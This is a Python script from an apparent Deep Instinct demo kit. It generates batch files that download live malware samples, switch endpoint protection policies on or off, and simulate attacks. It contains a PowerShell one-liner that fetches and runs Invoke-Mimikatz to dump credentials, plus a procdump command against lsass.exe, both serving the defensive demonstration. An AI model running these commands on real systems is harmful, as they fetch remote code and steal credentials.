"""
Generates .bat files to help run demo cases.  Bat files will be configured based on user input.
See readme.md for information on this script.

Required modules: See requirements.txt

Disclaimer:
This code is provided as an example of how to build code to demo and test
the Deep Instinct client and Deep Instinct "agentless" products. It is
provided AS-IS/NO WARRANTY. It has limited error checking and logging,
and likely contains defects or other deficiencies. Test thoroughly first,
and use at your own risk. This script and all others in this package
are not a Deep Instinct commercial product and is not officially
supported, although underlying Deep Instinct REST APIs are.
"""
import pathlib

import requests
from common import interactive
from repository.vt3.vt3_search import VT3Search
from conf.json_config_parser import JSONConfigParser


test_prevention = '''python set_windows_policy.py {} {} --prevention_level HIGH --ransomware_behavior PREVENT --in_memory_protection True --arbitrary_shellcode_execution PREVENT --remote_code_injection PREVENT --credentials_dump PREVENT --known_payload_execution PREVENT --api_connector {}'''
test_ransomware = '''python set_windows_policy.py {} {} --prevention_level DISABLED --ransomware_behavior PREVENT --in_memory_protection False --arbitrary_shellcode_execution ALLOW --remote_code_injection ALLOW --credentials_dump ALLOW --known_payload_execution ALLOW --api_connector {}'''
download_pe = '''python malware_downloader.py {} -o ./MALWARE -r VT3 type:"peexe" AND NOT tag:"corrupt" positives:60+ size:3mb- -n 20'''
download_pdf = '''python malware_downloader.py {} -o ./MALWARE -r VT3 type:"pdf" AND NOT tag:"corrupt" positives:45+ size:3mb- -n 10'''
download_doc = '''python malware_downloader.py {} -o ./MALWARE -r VT3 type:"doc" AND NOT tag:"corrupt" positives:45+ size:3mb- -n 10'''
download_known = '''python malware_downloader.py {} -o ./KnownMalware -r VT3 -n 250 fs:30d+ and fs:25d- type:"peexe" AND NOT tag:"corrupt" positives:55+ microsoft:infected size:3mb-'''
download_unknown = '''python malware_downloader.py {} -o ./UnknownMalware -r VT3 -n 250 fs:1d+ type:"peexe" AND NOT tag:"corrupt" positives:45+ size:3mb-'''
download_powershell = '''powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"'''
run_credential_dump_test = '''procdump -accepteula -ma lsass.exe'''
all_disabled = '''python set_windows_policy.py {} {} --prevention_level DISABLED --ransomware_behavior ALLOW --in_memory_protection False --arbitrary_shellcode_execution ALLOW --remote_code_injection ALLOW --credentials_dump ALLOW --known_payload_execution ALLOW --api_connector {}'''
download_hashes = '''
@ECHO OFF
SET index=1
SETLOCAL ENABLEDELAYEDEXPANSION
FOR %%f IN (*manifest.*) DO (
	SET file!index!=%%f
   	ECHO !index! - %%f
   	SET /A index=!index!+1
)

if "%index%" equ "1" (
	ECHO No files to choose from.  Please copy a file in the format of *manifest.* into this folder.
	pause
   	EXIT /B 1
)

SETLOCAL DISABLEDELAYEDEXPANSION
SET /P selection="Select hashfile by number: "
SET file%selection% >nul 2>&1
IF ERRORLEVEL 1 (
   	ECHO Invalid number selected   
   	pause
   	EXIT /B 1
)
CALL :RESOLVE %%file%selection%%%
GOTO :EOF

:RESOLVE
SET file_name=%1
ECHO Downloading hashes in file %file_name%
python malware_downloader.py {} {} -o ./MALWARE -n 20 %file_name%
'''

BAT_NAME_SET_POLICY_ALL_PREVENTION = "SetPolicy_AllPrevention.bat"
BAT_NAME_SET_POLICY_RANSOMWARE_ONLY = "SetPolicy_TestingBehavioralAnalysisRansomware.bat"
BAT_NAME_SET_POLICY_ALL_DISABLED = "SetPolicy_AllDisabled.bat"
BAT_NAME_TEST_PE_DOWNLOAD = "Test_PEDownload.bat"
BAT_NAME_TEST_PE_KNOWN = "KnownMalware.bat"
BAT_NAME_TEST_PE_UNKNOWN = "UnknownMalware.bat"
BAT_NAME_TEST_PDF_DOWNLOAD = "Test_PDFDownload.bat"
BAT_NAME_TEST_DOC_DOWNLOAD = "Test_DocDownload.bat"
BAT_NAME_TEST_POSH_DOWNLOAD_AND_INVOKE = "Test_POSHDownloadAndInvoke.bat"
BAT_NAME_TEST_CREDENTIAL_DUMPING = "Test_CredentialDumping.bat"
BAT_NAME_TEST_HASHLIST_DOWNLOAD = "Test_HashlistDownload.bat"


def main():
    print("This setup file will create configuration for the scripts and .BAT files for ease of use during demos.")

    cfg = JSONConfigParser()
    default_api_key = ''
    default_console_url = ''
    default_console_api_connector = ''

    # Read local config json file.
    if pathlib.Path('conf/config.json').exists():
        cfg.read_file(pathlib.Path('conf/config.json'))
        # Get default values from our config file
        default_api_key = cfg.get('virustotal', 'api_key')
        default_console_url = cfg.get('diconsole', 'di_console_url')
        default_console_api_connector = cfg.get('diconsole', 'di_console_api_connector')

    '''
    VT API key
    '''
    vt_private_key = False
    if interactive.input_yes_no('Do you have an Enterprise Virus Total API key (y|yes|n|no)?', 'yes'):
        virustotal_apikey = interactive.input_string(f"Please enter the Virus Total API key to use",
                                                     default_api_key,
                                                     str_format='[0-9a-f]{64}')

        interactive.msg('Testing Virus Total API key...', indent_level=1)
        try:
            file_info = VT3Search(virustotal_apikey).search_by_hash('c8bf1cc58d9e0e17977841c630365befe1852b416c037ac1775637d77137463a')
            if len(file_info.hashes()) == 1:
                interactive.msg('Using private API key', indent_level=1)
                vt_private_key = True
            else:
                interactive.msg('Using public repository, testing capabilities limited', indent_level=1)
        except Exception as e:
            interactive.msg(f'Virus Total API key is not valid, using public repository, testing capabilities limited',
                            indent_level=1)

    '''
    DI Console Policy 
    '''
    policy_id = -1
    api_connector = ''
    if interactive.input_yes_no("Do you wish to generate policy setters to demonstrate behavioral analysis engines ("
                                "y|yes|n|no)?",
                                'no'):

        console_url = interactive.input_string(f"Please enter the console URL", default=default_console_url)

        print(f"     Using console URL: {console_url}")

        policy_name = input("Please enter the name of the policy [default: Windows Default Policy]: ") or \
                      "Windows Default Policy"
        print(f"     Using policy name: {policy_name}")

        api_connector = interactive.input_string(
            f'Please enter the Deep Instinct API connector to use (must have Full Access)',
            default=default_console_api_connector)
        if not api_connector:
            print("ERROR: You must supply an API connector.")
            exit(-1)

        interactive.msg('Testing Deep Instinct API connector...', indent_level=1)
        policies = requests.get(f'https://{console_url}/api/v1/policies',
                                headers={'Authorization': api_connector}).json()

        if 'msg' in policies:
            print(f"ERROR: incorrect API Connector supplied - {policies['msg']}")
            exit(-2)

        interactive.msg(f'Policies named: {policy_name}', indent_level=2)
        interactive.msg(f'MSP:                ID:', indent_level=2)
        interactive.msg('----------------------------------------', indent_level=2)

        policy_id = -1
        policy_count = 0
        for policy in policies:
            if policy['name'] == policy_name:
                print(f"        {policy['msp_name']}:  {policy['id']}")
                policy_id = policy['id']
                policy_count += 1
        print("        ----------------------------------------\n")

        if policy_count > 1:
            policy_id = input("Please enter the policy ID:")
        else:
            interactive.msg(f'Only one Policy named {policy_name}.  Using policy ID: {policy_id}', indent_level=3)

    print("\n")
    with open(f"{BAT_NAME_TEST_HASHLIST_DOWNLOAD}", "wt") as f:
        if vt_private_key:
            api_key_arg = f'-a {virustotal_apikey}'
            bat = download_hashes.format(api_key_arg, '-r VT3') + "\n"
        else:
            bat = download_hashes.format('', '-r MB') + "\n"
        f.writelines(["@echo off\n", bat, "pause\n"])
        print(f"{BAT_NAME_TEST_HASHLIST_DOWNLOAD} created...")

    if vt_private_key:
        with open(f"{BAT_NAME_TEST_PE_DOWNLOAD}", "wt") as f:
            if vt_private_key:
                bat = download_pe.format(f'-a {virustotal_apikey}') + "\n"
            else:
                bat = download_pe.format('') + "\n"
            f.writelines(["@echo off\n", bat, "pause\n"])
            print(f"{BAT_NAME_TEST_PE_DOWNLOAD} created...")

        with open(f"{BAT_NAME_TEST_PE_KNOWN}", "wt") as f:
            if vt_private_key:
                bat = download_known.format(f'-a {virustotal_apikey}') + "\n"
            else:
                bat = download_known.format('') + "\n"
            f.writelines(["@echo off\npause\n", bat, "pause\n"])
            print(f"{BAT_NAME_TEST_PE_KNOWN} created...")

        with open(f"{BAT_NAME_TEST_PE_UNKNOWN}", "wt") as f:
            if vt_private_key:
                bat = download_unknown.format(f'-a {virustotal_apikey}') + "\n"
            else:
                bat = download_unknown.format('') + "\n"
            f.writelines(["@echo off\npause\n", bat, "pause\n"])
            print(f"{BAT_NAME_TEST_PE_UNKNOWN} created...")

        with open(f"{BAT_NAME_TEST_PDF_DOWNLOAD}", "wt") as f:
            if vt_private_key:
                bat = download_pdf.format(f'-a {virustotal_apikey}') + "\n"
            else:
                bat = download_pdf.format('') + "\n"
            f.writelines(["@echo off\n", bat, "pause\n"])
            print(f"{BAT_NAME_TEST_PDF_DOWNLOAD} created...")

        with open(f"{BAT_NAME_TEST_DOC_DOWNLOAD}", "wt") as f:
            if vt_private_key:
                bat = download_doc.format(f'-a {virustotal_apikey}') + "\n"
            else:
                bat = download_doc.format('') + "\n"
            f.writelines(["@echo off\n", bat, "pause\n"])
            print(f"{BAT_NAME_TEST_DOC_DOWNLOAD} created...")

    with open(f"{BAT_NAME_TEST_POSH_DOWNLOAD_AND_INVOKE}", "wt") as f:
        bat = download_powershell + "\n"
        f.writelines([bat, "pause\n"])
        print(f"{BAT_NAME_TEST_POSH_DOWNLOAD_AND_INVOKE} created...")

    if policy_id != -1:
        with open(f"{BAT_NAME_SET_POLICY_ALL_PREVENTION}", "wt") as f:
            bat = test_prevention.format(console_url, policy_id, api_connector) + "\n"
            f.writelines(["@echo off\n", bat, "pause\n"])
            print(f"{BAT_NAME_SET_POLICY_ALL_PREVENTION} created...")

        with open(f"{BAT_NAME_SET_POLICY_RANSOMWARE_ONLY}", "wt") as f:
            bat = test_ransomware.format(console_url, policy_id, api_connector) + "\n"
            f.writelines(["@echo off\n", bat, "pause\n"])
            print(f"{BAT_NAME_SET_POLICY_RANSOMWARE_ONLY} created...")

        with open(f"{BAT_NAME_SET_POLICY_ALL_DISABLED}", "wt") as f:
            bat = all_disabled.format(console_url, policy_id, api_connector) + "\n"
            f.writelines(["@echo off\n", bat, "pause\n"])
            print(f"{BAT_NAME_SET_POLICY_ALL_DISABLED} created...")

        with open(f"{BAT_NAME_TEST_CREDENTIAL_DUMPING}", "wt") as f:
            bat = run_credential_dump_test + "\n"
            f.writelines([bat, "pause\n"])
            print(f"{BAT_NAME_TEST_CREDENTIAL_DUMPING} created...")

    print("Done.")


if __name__ == '__main__':
    main()
